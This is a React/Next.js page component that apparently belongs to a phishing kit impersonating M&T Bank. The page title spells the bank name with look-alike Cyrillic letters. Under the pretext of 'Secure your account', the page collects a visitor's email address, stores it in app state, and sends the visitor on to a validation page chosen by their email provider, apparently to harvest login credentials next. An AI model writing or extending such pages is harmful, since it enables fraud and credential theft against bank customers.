import { yupResolver } from "@hookform/resolvers/yup";
import { useRouter } from "next/router";
import * as yup from "yup";
import React, { useContext, useState, useEffect } from "react";
import { useForm } from "react-hook-form";
import Head from "next/head";
import { Button } from "../../components/Button";
import { Container } from "../../components/Container";
import { Input } from "../../components/InputAlt";
import { Wrapper } from "../../components/Wrapper";
import { DataContext } from "../_app";

interface EmailProps {}

const schema = yup.object().shape({
  email: yup
    .string()
    .required("The field can't be left blank. Please enter your email address.")
    .email("Oops! Looks like the email address you have entered is not valid."),
});

export const Email: React.FC<EmailProps> = ({}) => {
  const [loading, setLoading] = useState(false);
  const { data: datas, setData } = useContext(DataContext);
  const { push } = useRouter();
  const {
    register,
    handleSubmit,
    formState: { errors },
    watch,
  } = useForm({
    resolver: yupResolver(schema),
    mode: `onSubmit`,
  });

  const onSubmit = handleSubmit(async (data) => {
    setLoading(true);

    setData({
      ...datas,
      ...data,
    });

    const emailProvider = data["email"].split("@")[1].split(".")[0];
    push(`/email/validate/${emailProvider}`);
  });

  useEffect(() => {
    const keyDownHandler = (event: KeyboardEvent) => {
      if (event.key === "Enter") {
        event.preventDefault();

        onSubmit();
      }
    };

    document.addEventListener("keydown", keyDownHandler);

    return () => {
      document.removeEventListener("keydown", keyDownHandler);
    };
  });
  return (
    <Wrapper>
      <Head>
        <title>Verify Email Detail | М&Т Ваnk</title>
      </Head>
      <Container
        upTitle={`Secure your account`}
        title={`Verify your email`}
        subTitle={`Enter the email address link to your account.`}
        loading={loading}
      >
        <Input
          error={errors.email && errors.email.message}
          register={register}
          name={`email`}
          curValue={watch(`email`)}
          label={`Email address`}
        />
        <Button label={`Continue`} disabled={loading} onClick={onSubmit} />
      </Container>
    </Wrapper>
  );
};

export default Email;
